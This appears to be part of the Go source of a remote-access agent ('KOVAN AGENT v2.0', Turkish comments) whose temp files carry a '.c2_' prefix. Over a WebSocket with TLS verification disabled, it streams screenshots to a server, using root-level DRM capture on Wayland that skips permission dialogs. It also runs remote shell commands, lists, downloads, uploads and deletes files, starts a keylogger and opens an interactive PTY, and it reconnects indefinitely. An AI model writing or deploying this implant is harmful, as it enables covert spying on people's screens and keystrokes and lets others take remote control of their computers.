						fmt.Sscanf(dim[0], "%d", &width)
						fmt.Sscanf(dim[1], "%d", &height)
					}
				}
				break
			}
		}
	}

	// Also try xrandr as fallback
	if width == 1920 && height == 1080 {
		cmd2 := exec.Command("xrandr", "--current")
		cmd2.Env = sessionEnv
		out2, err2 := cmd2.Output()
		if err2 == nil {
			for _, line := range strings.Split(string(out2), "\n") {
				if strings.Contains(line, "*") {
					fields := strings.Fields(line)
					if len(fields) >= 1 {
						dim := strings.Split(fields[0], "x")
						if len(dim) == 2 {
							fmt.Sscanf(dim[0], "%d", &width)
							fmt.Sscanf(dim[1], "%d", &height)
							break
						}
					}
				}
			}
		}
	}

	return
}

// isWayland detects if the session is running on Wayland
func isWayland() bool {
	if st := getEnvFromSession("XDG_SESSION_TYPE"); st == "wayland" {
		return true
	}
	if wd := getEnvFromSession("WAYLAND_DISPLAY"); wd != "" {
		return true
	}
	return false
}

// runWithSessionEnv creates a command that runs with the desktop user's session environment
func runWithSessionEnv(name string, args ...string) *exec.Cmd {
	cmd := exec.Command(name, args...)
	cmd.Env = discoverDesktopSessionEnv()
	return cmd
}

// runWithSessionEnvTimeout creates a command with timeout + session env (kills if stuck)
func runWithSessionEnvTimeout(timeout time.Duration, name string, args ...string) *exec.Cmd {
	ctx, _ := context.WithTimeout(context.Background(), timeout)
	cmd := exec.CommandContext(ctx, name, args...)
	cmd.Env = discoverDesktopSessionEnv()
	return cmd
}

// runWithTimeout creates a command with timeout (no session env, for root-level tools)
func runWithTimeout(timeout time.Duration, name string, args ...string) *exec.Cmd {
	ctx, _ := context.WithTimeout(context.Background(), timeout)
	cmd := exec.CommandContext(ctx, name, args...)
	return cmd
}

// captureTimeout is the max time we wait for any screenshot command
// gnome-screenshot on Wayland can pop up a permission dialog and hang forever!
const captureTimeout = 4 * time.Second

// testGnomeDbus tests GNOME Shell D-Bus screenshot method (with timeout)
func testGnomeDbus() bool {
	if _, err := exec.LookPath("gdbus"); err != nil {
		return false
	}
	testCmd := runWithSessionEnvTimeout(captureTimeout, "gdbus", "call", "--session",
		"--dest", "org.gnome.Shell.Screenshot",
		"--object-path", "/org/gnome/Shell/Screenshot",
		"--method", "org.gnome.Shell.Screenshot.Screenshot",
		"false", "false", "/tmp/.c2_screen_test.png")
	if err := testCmd.Run(); err != nil {
		log.Printf("[SCREEN] gnome-dbus test FAIL: %v (timeout veya izin dialogu?)", err)
		os.Remove("/tmp/.c2_screen_test.png")
		return false
	}
	info, _ := os.Stat("/tmp/.c2_screen_test.png")
	os.Remove("/tmp/.c2_screen_test.png")
	if info != nil && info.Size() > 1024 {
		log.Printf("[SCREEN] gnome-dbus test OK (%d bytes)", info.Size())
		return true
	}
	return false
}

// testGnomeScreenshot tests gnome-screenshot command (with timeout)
func testGnomeScreenshot() bool {
	if _, err := exec.LookPath("gnome-screenshot"); err != nil {
		return false
	}
	testCmd := runWithSessionEnvTimeout(captureTimeout, "gnome-screenshot", "-f", "/tmp/.c2_screen_test.png")
	if err := testCmd.Run(); err != nil {
		log.Printf("[SCREEN] gnome-screenshot test FAIL: %v (timeout veya izin dialogu?)", err)
		os.Remove("/tmp/.c2_screen_test.png")
		return false
	}
	info, _ := os.Stat("/tmp/.c2_screen_test.png")
	os.Remove("/tmp/.c2_screen_test.png")
	if info != nil && info.Size() > 1024 {
		log.Printf("[SCREEN] gnome-screenshot test OK (%d bytes)", info.Size())
		return true
	}
	return false
}

// testFFmpegX11grab tests ffmpeg x11grab capture (only works on real X11, not Wayland)
func testFFmpegX11grab() bool {
	if !ensureFFmpeg() {
		return false
	}
	display, w, h := getDisplayInfo()
	testFile := "/tmp/.c2_screen_test_ffmpeg.jpg"
	cmd := runWithSessionEnvTimeout(captureTimeout, "ffmpeg", "-y",
		"-f", "x11grab",
		"-draw_mouse", "0",
		"-video_size", fmt.Sprintf("%dx%d", w, h),
		"-i", display,
		"-frames:v", "1",
		"-q:v", "10",
		"-loglevel", "error",
		testFile)
	if err := cmd.Run(); err != nil {
		os.Remove(testFile)
		return false
	}
	info, err := os.Stat(testFile)
	os.Remove(testFile)
	if err != nil {
		return false
	}
	if info.Size() < 5120 {
		log.Printf("[SCREEN] ffmpeg x11grab: siyah ekran (%d bytes) — Wayland olabilir", info.Size())
		return false
	}
	log.Printf("[SCREEN] ffmpeg x11grab test OK (%d bytes, %dx%d, %s)", info.Size(), w, h, display)
	return true
}

// testFFmpegKmsgrab tests ffmpeg kmsgrab (DRM-level, works on any display server, needs root)
func testFFmpegKmsgrab() bool {
	if !ensureFFmpeg() {
		return false
	}
	testFile := "/tmp/.c2_screen_test_kmsgrab.jpg"
	cmd := runWithTimeout(captureTimeout, "ffmpeg", "-y",
		"-f", "kmsgrab",
		"-i", "-",
		"-vf", "hwdownload,format=bgr0",
		"-frames:v", "1",
		"-q:v", "10",
		"-loglevel", "error",
		testFile)
	if err := cmd.Run(); err != nil {
		os.Remove(testFile)
		return false
	}
	info, err := os.Stat(testFile)
	os.Remove(testFile)
	if err != nil {
		return false
	}
	if info.Size() < 5120 {
		return false
	}
	log.Printf("[SCREEN] ffmpeg kmsgrab test OK (%d bytes)", info.Size())
	return true
}

// detectCaptureMethod finds the best screenshot tool for Pardus (GNOME, Wayland or X11)
// Priority on X11: ffmpeg x11grab (lightweight) → gnome-dbus → scrot → gnome-screenshot (heavy CPU)
// Priority on Wayland: gnome-dbus → gnome-screenshot → kmsgrab → grim
// XAUTHORITY is auto-discovered for X11 auth (prevents black screen)
func detectCaptureMethod() string {
	if isWindows {
		return "powershell"
	}

	// Discover desktop session env first (critical for XAUTHORITY + DISPLAY)
	discoverDesktopSessionEnv()

	wayland := isWayland()
	log.Printf("[SCREEN] Oturum: wayland=%v, DISPLAY=%s, XAUTHORITY=%s, XDG_SESSION_TYPE=%s",
		wayland, getEnvFromSession("DISPLAY"), getEnvFromSession("XAUTHORITY"), getEnvFromSession("XDG_SESSION_TYPE"))

	if wayland {
		// === WAYLAND: x11grab çalışmaz! Izin dialogu açmayan yöntemler önce. ===

		// 1. kmsgrab (DRM level, root gerekir, izin dialogu YOK, en güvenilir)
		if testFFmpegKmsgrab() {
			log.Println("[SCREEN] ✓ Yakalama yöntemi: ffmpeg-kmsgrab (Wayland/DRM)")
			return "ffmpeg-kmsgrab"
		}

		// 2. grim (wlroots — Sway vb., izin dialogu yok)
		if path, err := exec.LookPath("grim"); err == nil {
			testCmd := runWithSessionEnvTimeout(captureTimeout, path, "/tmp/.c2_screen_test.png")
			if err := testCmd.Run(); err == nil {
				os.Remove("/tmp/.c2_screen_test.png")
				log.Println("[SCREEN] ✓ Yakalama yöntemi: grim (Wayland)")
				return "grim"
			}
		}

		// 3. GNOME D-Bus Screenshot (izin dialogu açabilir! timeout koruması var)
		if testGnomeDbus() {
			log.Println("[SCREEN] ✓ Yakalama yöntemi: gnome-dbus (Wayland)")
			return "gnome-dbus"
		}

		// 4. gnome-screenshot (izin dialogu açabilir! timeout koruması var)
		if testGnomeScreenshot() {
			log.Println("[SCREEN] ✓ Yakalama yöntemi: gnome-screenshot (Wayland)")
			return "gnome-screenshot"
		}

		log.Println("[SCREEN] ✗ Wayland'da çalışan araç bulunamadı, X11 fallback deneniyor...")
	}

	// === X11: ffmpeg x11grab en hafif + güvenilir (XAUTHORITY ile) ===

	// 1. ffmpeg x11grab — düşük CPU, hızlı (XAUTHORITY keşfedildi)
	if testFFmpegX11grab() {
		log.Println("[SCREEN] ✓ Yakalama yöntemi: ffmpeg (x11grab)")
		return "ffmpeg"
	}

	// 2. GNOME D-Bus (X11'de de çalışır)
	if testGnomeDbus() {
		log.Println("[SCREEN] ✓ Yakalama yöntemi: gnome-dbus")
		return "gnome-dbus"
	}

	// 3. scrot (hafif, X11)
	if path, err := exec.LookPath("scrot"); err == nil {
		testCmd := runWithSessionEnv(path, "/tmp/.c2_screen_test.png")
		if err := testCmd.Run(); err == nil {
			os.Remove("/tmp/.c2_screen_test.png")
			log.Println("[SCREEN] ✓ Yakalama yöntemi: scrot")
			return "scrot"
		}
	}

	// 4. import (ImageMagick, X11)
	if _, err := exec.LookPath("import"); err == nil {
		log.Println("[SCREEN] ✓ Yakalama yöntemi: import")
		return "import"
	}

	// 5. gnome-screenshot — son çare (yüksek CPU kullanımı!)
	if testGnomeScreenshot() {
		log.Println("[SCREEN] ✓ Yakalama yöntemi: gnome-screenshot (⚠ yüksek CPU)")
		return "gnome-screenshot"
	}

	return ""
}

// captureScreenshotDirect takes a screenshot and returns JPEG bytes directly
// Optimizasyon: Araçların doğrudan JPEG çıktı vermesini sağla, PNG→JPEG dönüşümünü atla
func captureScreenshotDirect(method string, quality int) []byte {
	tmpFileJPG := "/tmp/.c2_screen_capture.jpg"
	tmpFilePNG := "/tmp/.c2_screen_capture.png"
	if isWindows {
		tmpFileJPG = os.TempDir() + "\\.c2_screen_capture.jpg"
		tmpFilePNG = os.TempDir() + "\\.c2_screen_capture.png"
	}

	var cmd *exec.Cmd
	usesJPG := false

	// ffmpeg quality mapping: user quality 0-100 → ffmpeg q:v 31(worst)-2(best)
	ffQuality := 31 - quality*29/100
	if ffQuality < 2 {
		ffQuality = 2
	}

	switch method {
	case "ffmpeg":
		// ffmpeg x11grab: tek frame yakala, doğrudan JPEG (sadece X11)
		display, w, h := getDisplayInfo()
		cmd = runWithSessionEnvTimeout(captureTimeout, "ffmpeg", "-y",
			"-f", "x11grab",
			"-video_size", fmt.Sprintf("%dx%d", w, h),
			"-i", display,
			"-frames:v", "1",
			"-q:v", fmt.Sprintf("%d", ffQuality),
			"-loglevel", "error",
			tmpFileJPG)
		usesJPG = true
	case "ffmpeg-kmsgrab":
		// ffmpeg kmsgrab: DRM seviyesinde yakalama (Wayland + X11, root gerekir)
		cmd = runWithTimeout(captureTimeout, "ffmpeg", "-y",
			"-f", "kmsgrab",
			"-i", "-",
			"-vf", "hwdownload,format=bgr0",
			"-frames:v", "1",
			"-q:v", fmt.Sprintf("%d", ffQuality),
			"-loglevel", "error",
			tmpFileJPG)
		usesJPG = true
	case "gnome-dbus":
		// gnome-dbus yalnızca PNG destekler — timeout ile (izin dialogu bloklar!)
		cmd = runWithSessionEnvTimeout(captureTimeout, "gdbus", "call", "--session",
			"--dest", "org.gnome.Shell.Screenshot",
			"--object-path", "/org/gnome/Shell/Screenshot",
			"--method", "org.gnome.Shell.Screenshot.Screenshot",
			"false", "false", tmpFilePNG)
	case "gnome-screenshot":
		// gnome-screenshot yalnızca PNG destekler — timeout ile (izin dialogu bloklar!)
		cmd = runWithSessionEnvTimeout(captureTimeout, "gnome-screenshot", "-f", tmpFilePNG)
	case "grim":
		// grim doğrudan JPEG destekler!
		cmd = runWithSessionEnvTimeout(captureTimeout, "grim", "-t", "jpeg", "-q", fmt.Sprintf("%d", quality), tmpFileJPG)
		usesJPG = true
	case "scrot":
		// scrot dosya uzantısına göre format seçer → .jpg = JPEG
		cmd = runWithSessionEnvTimeout(captureTimeout, "scrot", tmpFileJPG, "--overwrite", "-q", fmt.Sprintf("%d", quality))
		usesJPG = true
	case "import":
		// import (ImageMagick) doğrudan JPEG yazabilir
		cmd = runWithSessionEnvTimeout(captureTimeout, "import", "-window", "root", "-quality", fmt.Sprintf("%d", quality), tmpFileJPG)
		usesJPG = true
	case "powershell":
		// PowerShell: doğrudan JPEG kaydet (PNG→JPEG dönüşümü yok)
		psScript := fmt.Sprintf(`
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
$screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
$bmp = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height)
$g = [System.Drawing.Graphics]::FromImage($bmp)
$g.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size)
$codec = [System.Drawing.Imaging.ImageCodecInfo]::GetImageEncoders() | Where-Object { $_.MimeType -eq 'image/jpeg' }
$params = New-Object System.Drawing.Imaging.EncoderParameters(1)
$params.Param[0] = New-Object System.Drawing.Imaging.EncoderParameter([System.Drawing.Imaging.Encoder]::Quality, [long]%d)
$bmp.Save('%s', $codec, $params)
$g.Dispose()
$bmp.Dispose()
`, quality, strings.ReplaceAll(tmpFileJPG, "'", "''"))
		cmd = exec.Command("powershell", "-NoProfile", "-Command", psScript)
		usesJPG = true
	default:
		return nil
	}

	if err := cmd.Run(); err != nil {
		return nil
	}

	if usesJPG {
		// Doğrudan JPEG okunur — dönüşüm yok, CPU tasarrufu!
		data, err := os.ReadFile(tmpFileJPG)
		if err != nil {
			return nil
		}
		return data
	}

	// PNG formatındaki araçlar için: PNG → JPEG dönüşümü (gnome-dbus, gnome-screenshot)
	data, err := os.ReadFile(tmpFilePNG)
	if err != nil {
		return nil
	}

	img, err := png.Decode(bytes.NewReader(data))
	if err != nil {
		return data
	}

	var buf bytes.Buffer
	err = jpeg.Encode(&buf, img, &jpeg.Options{Quality: quality})
	if err != nil {
		return data
	}

	return buf.Bytes()
}

// simpleHash computes a fast hash for change detection (samples pixels, not full hash)
func simpleHash(data []byte) uint64 {
	if len(data) < 64 {
		return 0
	}
	var h uint64
	step := len(data) / 32 // 32 noktadan örnekle
	if step < 1 {
		step = 1
	}
	for i := 0; i < len(data); i += step {
		h = h*31 + uint64(data[i])
	}
	return h
}

// startScreenStream starts the screenshot streaming loop
func startScreenStream(data map[string]interface{}) {
	screenMu.Lock()
	defer screenMu.Unlock()

	if screenStreaming {
		log.Println("[SCREEN] Zaten aktif, önce durduruluyor...")
		stopScreenStreamLocked()
	}

	// Varsayılan: 2 FPS, quality 30 (düşük CPU)
	fps := 2
	quality := 30

	if v, ok := data["fps"].(float64); ok && v > 0 && v <= 30 {
		fps = int(v)
	}
	if v, ok := data["quality"].(float64); ok && v > 0 && v <= 100 {
		quality = int(v)
	}

	log.Printf("[SCREEN] Başlatılıyor :: fps=%d quality=%d", fps, quality)

	// Yakalama yöntemi bul
	method := detectCaptureMethod()
	if method == "" {
		log.Println("[SCREEN] Hiçbir ekran yakalama yöntemi bulunamadı!")
		sendMessage(map[string]interface{}{
			"type": "screen_error", "agentId": agentID,
			"data": map[string]interface{}{
				"error": "Ekran yakalama aracı bulunamadı. Şunlardan birini kurun: gnome-screenshot, scrot, grim veya imagemagick (import)",
			},
		})
		return
	}

	screenStreaming = true
	screenStopCh = make(chan struct{})
	stopCh := screenStopCh

	sendMessage(map[string]interface{}{
		"type": "screen_started", "agentId": agentID,
		"data": map[string]interface{}{"fps": fps, "method": method},
	})

	go func() {
		interval := time.Second / time.Duration(fps)
		ticker := time.NewTicker(interval)
		defer ticker.Stop()

		frameCount := 0
		skippedCount := 0
		failCount := 0
		lastLog := time.Now()
		var lastHash uint64

		for {
			select {
			case <-stopCh:
				log.Println("[SCREEN] Akış durduruldu (stop sinyali)")
				return
			case <-ticker.C:
				// Stop kontrolü (capture'dan ÖNCE)
				select {
				case <-stopCh:
					log.Println("[SCREEN] Akış durduruldu (stop sinyali, pre-capture)")
					return
				default:
				}

				frameData := captureScreenshotDirect(method, quality)

				// Stop kontrolü (capture'dan SONRA — komut bloklanmış olabilir)
				select {
				case <-stopCh:
					log.Println("[SCREEN] Akış durduruldu (stop sinyali, post-capture)")
					return
				default:
				}

				if frameData == nil {
					failCount++
					if failCount >= 5 {
						log.Printf("[SCREEN] Art arda %d başarısız yakalama, akış durduruluyor", failCount)
						sendMessage(map[string]interface{}{
							"type": "screen_error", "agentId": agentID,
							"data": map[string]interface{}{
								"error": fmt.Sprintf("Ekran yakalama art arda %d kez başarısız oldu. Yöntem: %s", failCount, method),
							},
						})
						return
					}
					continue
				}
				failCount = 0

				// Değişim kontrolü: ekran değişmediyse frame gönderme
				hash := simpleHash(frameData)
				if hash == lastHash {
					skippedCount++
					continue
				}
				lastHash = hash

				// Binary WebSocket mesajı yerine base64 (uyumluluk için)
				b64 := base64.StdEncoding.EncodeToString(frameData)
				sendMessage(map[string]interface{}{
					"type":    "screen_frame",
					"agentId": agentID,
					"data": map[string]interface{}{
						"frame": b64,
						"ts":    time.Now().UnixMilli(),
					},
				})

				frameCount++
				if time.Since(lastLog) > 10*time.Second {
					log.Printf("[SCREEN] %d frame gönderildi, %d atlandı (son 10s), boyut: ~%d KB", frameCount, skippedCount, len(frameData)/1024)
					frameCount = 0
					skippedCount = 0
					lastLog = time.Now()
				}
			}
		}
	}()
}

// stopScreenStream stops the screenshot streaming
func stopScreenStream() {
	screenMu.Lock()
	defer screenMu.Unlock()
	stopScreenStreamLocked()
}

func stopScreenStreamLocked() {
	if screenStopCh != nil {
		close(screenStopCh)
		screenStopCh = nil
	}
	screenStreaming = false
	sendMessage(map[string]interface{}{
		"type": "screen_stopped", "agentId": agentID,
	})
	log.Println("[SCREEN] Durduruldu")
}

// ===== WebSocket =====
func sendMessage(msg interface{}) {
	connMu.Lock()
	defer connMu.Unlock()
	if conn != nil {
		data, err := json.Marshal(msg)
		if err != nil {
			return
		}
		conn.WriteMessage(websocket.TextMessage, data)
	}
}

func connect(serverURL string) {
	sysInfo := getSystemInfo()

	log.Printf("[AGENT] baglaniliyor: %s", serverURL)
	log.Printf("[AGENT] sistem: %s@%s (%s)", sysInfo["username"], sysInfo["hostname"], sysInfo["os"])
	fp := sysInfo["fingerprint"].(string)
	if len(fp) > 8 {
		log.Printf("[AGENT] fingerprint: %s...", fp[:8])
	}

	u, err := url.Parse(serverURL)
	if err != nil {
		log.Printf("[AGENT] url parse hatasi: %v", err)
		return
	}

	dialer := websocket.Dialer{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}

	_ = u // used for logging

	for {
		c, _, err := dialer.Dial(serverURL, nil)
		if err != nil {
			log.Printf("[AGENT] baglanti hatasi: %v :: %s sonra tekrar denenecek", err, reconnectDelay)
			time.Sleep(reconnectDelay)
			continue
		}

		connMu.Lock()
		conn = c
		connMu.Unlock()

		log.Println("[AGENT] baglanti kuruldu")

		// Register
		sendMessage(map[string]interface{}{
			"type": "register",
			"data": sysInfo,
		})

		// Start heartbeat
		stopCh := make(chan struct{})
		go func() {
			// Init CPU measurement
			getCPUUsage()
			ticker := time.NewTicker(heartbeatInterval)
			defer ticker.Stop()
			for {
				select {
				case <-ticker.C:
					if agentID != "" {
						metrics := collectMetrics()
						sendMessage(map[string]interface{}{
							"type":    "heartbeat",
							"agentId": agentID,
							"data":    map[string]interface{}{"metrics": metrics},
						})
					}
				case <-stopCh:
					return
				}
			}
		}()

		// Read messages
		for {
			_, rawMsg, err := c.ReadMessage()
			if err != nil {
				log.Printf("[AGENT] baglanti kapandi: %v :: yeniden baglanilacak...", err)
				break
			}

			var msg map[string]interface{}
			if err := json.Unmarshal(rawMsg, &msg); err != nil {
				log.Printf("[AGENT] mesaj parse hatasi: %v", err)
				continue
			}

			msgType, _ := msg["type"].(string)
			switch msgType {
			case "registered":
				agentID, _ = msg["agentId"].(string)
				log.Printf("[AGENT] kayit basarili :: id: %s", agentID)

			case "command":
				if data, ok := msg["data"].(map[string]interface{}); ok {
					commandID, _ := data["commandId"].(string)
					command, _ := data["command"].(string)
					log.Printf("[AGENT] komut alindi: %s (%s)", command, commandID)
					go executeCommand(commandID, command)
				}

			case "file_list":
				if data, ok := msg["data"].(map[string]interface{}); ok {
					go handleFileList(data)
				}
			case "file_download":
				if data, ok := msg["data"].(map[string]interface{}); ok {
					go handleFileDownload(data)
				}
			case "file_upload":
				if data, ok := msg["data"].(map[string]interface{}); ok {
					go handleFileUpload(data)
				}
			case "file_delete":
				if data, ok := msg["data"].(map[string]interface{}); ok {
					go handleFileDelete(data)
				}
			case "file_move":
				if data, ok := msg["data"].(map[string]interface{}); ok {
					go handleFileMove(data)
				}
			case "file_copy":
				if data, ok := msg["data"].(map[string]interface{}); ok {
					go handleFileCopy(data)
				}

			case "screen_start":
				data, _ := msg["data"].(map[string]interface{})
				if data == nil {
					data = map[string]interface{}{}
				}
				go startScreenStream(data)
			case "screen_stop":
				go stopScreenStream()

			case "keylog_start":
				data, _ := msg["data"].(map[string]interface{})
				if data == nil {
					data = map[string]interface{}{}
				}
				go startKeylogger(data)
			case "keylog_stop":
				go stopKeylogger()

			case "pty_start":
				data, _ := msg["data"].(map[string]interface{})
				if data == nil {
					data = map[string]interface{}{}
				}
				go startPTY(data)
			case "pty_stop":
				go stopPTY()
			case "pty_input":
				if data, ok := msg["data"].(map[string]interface{}); ok {
					writePTY(data)
				}
			case "pty_resize":
				if data, ok := msg["data"].(map[string]interface{}); ok {
					resizePTY(data)
				}

			default:
				log.Printf("[AGENT] bilinmeyen mesaj: %s", msgType)
			}
		}

		// Cleanup
		close(stopCh)
		stopScreenStream()
		stopKeylogger()
		stopPTY()
		connMu.Lock()
		conn = nil
		connMu.Unlock()
		agentID = ""

		time.Sleep(reconnectDelay)
	}
}

// ===== Main =====
func main() {
	// Check installer commands first
	if handleDaemonCommand(os.Args) {
		return
	}

	serverURL := parseServerURL()

	fmt.Printf(`
:: KOVAN AGENT v2.0 (Go)
:: Sunucu: %s
`, serverURL)

	connect(serverURL)
}
